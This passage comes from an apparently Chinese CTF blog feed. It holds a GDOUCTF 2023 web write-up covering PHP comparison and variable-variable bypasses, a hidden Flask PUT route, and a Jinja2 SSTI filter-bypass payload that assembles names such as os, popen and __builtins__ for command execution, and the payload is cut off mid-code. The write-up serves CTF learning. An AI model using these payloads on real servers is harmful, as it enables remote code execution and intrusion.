title="HTTP_CLIENT_IP:"></a>HTTP_CLIENT_IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÂÆ¢Êà∑Á´ØÂèëÈÄÅHTTPËØ∑Ê±ÇÊó∂‰ΩøÁî®ÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅHTTPËØ∑Ê±ÇÊòØÂê¶Êù•Ëá™Âêå‰∏ÄÂÆ¢Êà∑Á´Ø„ÄÇ</p><h3 id="X-Real-IP"><a href="#X-Real-IP" class="headerlink" title="X-Real-IP:"></a>X-Real-IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÂÆ¢Êà∑Á´ØÁöÑÁúüÂÆûIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÂÆ¢Êà∑Á´ØÊòØÂê¶‰∏éÊúçÂä°Âô®Âú®Âêå‰∏ÄÁΩëÁªú‰∏≠„ÄÇ</p><h3 id="X-Originating-IP"><a href="#X-Originating-IP" class="headerlink" title="X-Originating-IP:"></a>X-Originating-IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÊúçÂä°Âô®ËøîÂõûÁªôÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÊúçÂä°Âô®ÊòØÂê¶ÂèëËµ∑‰∫ÜËØ•HTTPËØ∑Ê±ÇÔºåËØ•Âú∞ÂùÄÂ∫î‰∏éHTTPÂìçÂ∫îÁõ∏ÂåπÈÖç„ÄÇ</p><h3 id="via"><a href="#via" class="headerlink" title="via:"></a>via:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÈÄöËøá‰ª£ÁêÜÊúçÂä°Âô®ËΩ¨ÂèëÁöÑ IP Âú∞ÂùÄÔºåËøôÈÄöÂ∏∏Áî®‰∫éÈ™åËØÅÂÆ¢Êà∑Á´ØÊòØÂê¶ÈÄöËøá‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÈÄö‰ø°„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF 2023</title>
      <link href="/2023/04/17/GDOUCTF-2023/"/>
      <url>/2023/04/17/GDOUCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h3><p><strong>JS</strong><br><img src="https://img-blog.csdnimg.cn/83a1d5e00991490b8df76fbf9ff9b211.png" alt="1"><br>ÂÉèÈÅáÂà∞Ê∏∏ÊàèÈ¢òÁõÆÂ∏∏ËßÑÊÄùË∑ØÂ∞±ÊòØF12ÊîπÊï∞ÊçÆÊàñËÄÖË∞ÉËØïÔºåÊú¨È¢ò‰πü‰∏ÄÊ†∑„ÄÇÁî±‰∫éÊú¨È¢òÊ∏∏ÊàèËøáÁ®ã‰∏≠ÈÄüÂ∫¶‰ºöË∂äÊù•Ë∂äÂø´ÔºåÂú®js‰ª£Á†Å‰∏≠ÂØªÊâæspeedÁöÑÈÄªËæë„ÄÇ<br><img src="https://img-blog.csdnimg.cn/17ccc8f0652c48a4936ccf77acc9ec2a.png" alt="2"><br>Ë∞ÉËØï‰∏Ä‰∏ãÊîπ‰∏∫**this.speed;**ÁÑ∂ÂêéÁÑ∂‰ªñËøêË°å‰∏ÄÊÆµÊó∂Èó¥Â∞±ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/17dfe7a150b248e5bae600152eb3f4be.png" alt="2"></p><h3 id="Âèó‰∏ç‰∫Ü‰∏ÄÁÇπ"><a href="#Âèó‰∏ç‰∫Ü‰∏ÄÁÇπ" class="headerlink" title="Âèó‰∏ç‰∫Ü‰∏ÄÁÇπ"></a>Âèó‰∏ç‰∫Ü‰∏ÄÁÇπ</h3><p><strong>ÂÆ°ËÆ°‰ª£Á†Å</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Ê¥óÊ¥óÁù°Âêß"</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Ë°å‰∏çË°åÂïäÁªÜÁãó"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ËèúËèú'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Â∞±Ëøô?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Âà´Êù•Ê≤æËæπ"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â±ÇÂ±ÇÁªïËøá„ÄÇ<br>GET<br><code>?aaa=114514a&amp;bbb=114514b&amp;a=flag&amp;flag=a</code><br>POST<br><code>gdou[]=1&amp;ctf[]=2</code><br>COOKIE<br><code>cookie=j0k3r</code><br><img src="https://img-blog.csdnimg.cn/4a2c6f2e48e24be696a551a8aa9ca7fc.png" alt="3"></p><h3 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h3><p><strong>Ê∫êÁ†ÅÊ≥ÑÈú≤</strong><br>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://img-blog.csdnimg.cn/a8e1c77c98894795bc9d1f5ebfbc0d8e.png" alt="3"><br>ËÆøÈóÆ&#x2F;src‰∏ãËΩΩÊ∫êÁ†Å</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flaskapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËÆøÈóÆ<code>/super-secret-route-nobody-will-guess</code>burpÊäìÂåÖGETÊîπ‰∏∫PUTÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f428cefb45aa4c01abc3e53ba9b68ffc.png" alt="5"></p><h3 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h3><p><strong>pythonÊ°ÜÊû∂jinja2 SSTIÊºèÊ¥û</strong><br>ÊúâÂ≠¶‰π†‰ª∑ÂÄº„ÄÇ<br><img src="https://img-blog.csdnimg.cn/0c4046d1d8424ffba759b0ee71cfc198.png" alt="6"></p><p><code>Êä•ÈîôÂá∫Ê°ÜÊû∂Ôºå‰ΩøÁî®&#123;&#123;&#125;&#125;‰∏çË°åÔºåÁúãÊù•ËøáÊª§‰∫ÜÂæàÂ§ö‰∏úË•ø„ÄÇ</code></p><p><img src="https://img-blog.csdnimg.cn/d8a9ca545e6d41df9e13375ff8a2a8f4.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/c5d8870ec29a4b3599c606cbff32dca9.png" alt="7"><br><img src="https://img-blog.csdnimg.cn/106cfa10d2934b5887fc065029a1886f.png" alt="8"><br>ÊàêÂäüÊâßË°å„ÄÇFUZZÊµãËØï‰∏Ä‰∏ãËøáÊª§‰∫ÜÂì™‰∫õÂ≠óÁ¨¶<br><img src="https://img-blog.csdnimg.cn/6799efdd8ebf402abcbf0bce782a6c80.png" alt="9"></p><blockquote><p>ËøáÊª§Â≠óÁ¨¶Â¶Ç‰∏ä„ÄÇ</p></blockquote><p>ÂèÇËÄÉÂçöÂÆ¢<a href="https://blog.csdn.net/weixin_52635170/article/details/129856818">ÁªïËøáÂßøÂäø</a><br>ÂÖàÊääÊï∞Â≠óÂÖ®ÁªôËé∑Âèñ‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b1e9d4878b3142b1a1155b16fc9ee167.png" alt="1"><br>ÁÑ∂ÂêéÂºÄÂßã<strong>ÊãºÊé•payload</strong><br>ÂèÇËÄÉ<a href="https://blog.csdn.net/Jayjay___/article/details/130186511">wp</a>Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># È¶ñÂÖàÊûÑÈÄ†Âá∫ÊâÄÈúÄÁöÑÊï∞Â≠ó: </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> zero <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 0, ‰πüÂèØ‰ª•‰ΩøÁî®lenghtËøáÊª§Âô®Ëé∑ÂèñÊï∞Â≠ó</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> one <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">**</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> two <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 2</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> four <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 4</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> five <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 5</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> three <span class="token operator">=</span> five<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 3</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> nine <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">-</span>five<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 9</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> seven <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 7</span><span class="token comment"># ÊûÑÈÄ†Âá∫ÊâÄÈúÄÁöÑÂêÑÁßçÂ≠óÁ¨¶‰∏éÂ≠óÁ¨¶‰∏≤: </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> space <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># Á©∫Ê†º</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># .</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>c<span class="token operator">=</span>aa<span class="token punctuation">)</span><span class="token operator">|</span>reverse<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># Â≠óÁ¨¶ c</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfh <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ÁôæÂàÜÂè∑ %</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfhc <span class="token operator">=</span> bfh<span class="token operator">~</span>c <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ËøôÈáåÊûÑÈÄ†‰∫Ü%c, ‰πãÂêéÂèØ‰ª•Âà©Áî®Ëøô‰∏™%cÊûÑÈÄ†‰ªªÊÑèÂ≠óÁ¨¶„ÄÇ~Áî®‰∫éÂ≠óÁ¨¶ËøûÊé•</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> slas <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>seven<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ‰ΩøÁî®%cÊûÑÈÄ†ÊñúÊù† /</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> yin <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>three<span class="token operator">~</span>nine<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ‰ΩøÁî®%cÊûÑÈÄ†ÂºïÂè∑ '</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">~</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ‰ΩøÁî®%cÊûÑÈÄ†‰∏ãÂàíÁ∫ø _</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> right <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ‰ΩøÁî®%cÊûÑÈÄ†Âè≥Êã¨Âè∑ )</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> left <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ‰ΩøÁî®%cÊûÑÈÄ†Â∑¶Êã¨Âè∑ (</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> but <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>aa<span class="token punctuation">,</span>tins<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> imp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>aa<span class="token punctuation">,</span>ort<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># import</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pon <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>aa<span class="token punctuation">,</span>pen<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># popen</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> so <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># os</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ca <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ca<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># cat</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> l <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>l<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>           <span class="token comment">#ls     //&#123;%%0cset%0cls%0c=%0cdict(l=aa,s=dd)|join%0c%&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> flg <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>fl<span class="token operator">=</span>aa<span class="token punctuation">,</span>ag<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># flag</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ev <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>aa<span class="token punctuation">,</span>al<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> red <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>re<span class="token operator">=</span>aa<span class="token punctuation">,</span>ad<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># read</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bul <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>but<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># __builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ini <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># init</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> glo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>aa<span class="token punctuation">,</span>bals<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> itm <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ite<span class="token operator">=</span>aa<span class="token punctuation">,</span>ms<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token 